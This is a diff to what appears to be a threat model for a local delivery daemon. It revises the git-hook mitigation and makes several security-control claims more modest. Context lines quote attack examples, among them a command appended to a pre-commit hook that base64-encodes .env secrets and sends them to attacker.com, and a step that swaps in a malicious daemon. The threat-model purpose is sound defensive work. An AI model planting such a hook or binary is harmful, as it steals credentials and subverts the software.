@@ -95,7 +95,7 @@ pip install shadow313[full]  # if PyPI package is compromised
 echo 'curl attacker.com/$(cat .env | base64)' >> .git/hooks/pre-commit
 ```
 **Detection:** NEXUS-SIG-013 (file modification), eBPF execve hook
-**Mitigation:** Daemon doesn't run git hooks — only `git add/commit`
+**Mitigation:** Git auto-commit is disabled by default. If explicitly enabled, it is restricted to feature branches, runs the secret scanner, and preserves normal Git hooks.
 
 **Vector 3: Daemon binary replacement**
 ```bash
@@ -207,9 +207,9 @@ cp malicious_daemon.py scripts/delivery/daemon.py
 │  │  SECURITY CONTROLS                                          │   │
 │  │  ✅ Bind to 127.0.0.1 only (not 0.0.0.0)                   │   │
 │  │  ✅ SHA3-256 hash in every download response header         │   │
-│  │  ✅ 313-BIND receipt chain — tamper detection               │   │
+│  │  ✅ 313-BIND local hash chain — consistency evidence only; no digital signature or external anchor               │   │
 │  │  ✅ Secret scanner runs before every build                  │   │
-│  │  ✅ Provenance class: REAL_OBSERVATION on all artifacts     │   │
+│  │  ✅ Provenance class: ARTIFACT_INVENTORY (local file hashes, not live sensor evidence)     │   │
 │  │  ✅ Daemon.py self-hash in manifest — detect replacement    │   │
 │  │  ✅ Rate limiting: 100 req/min per IP                       │   │
 │  │  ✅ No shell=True anywhere in daemon code                   │   │
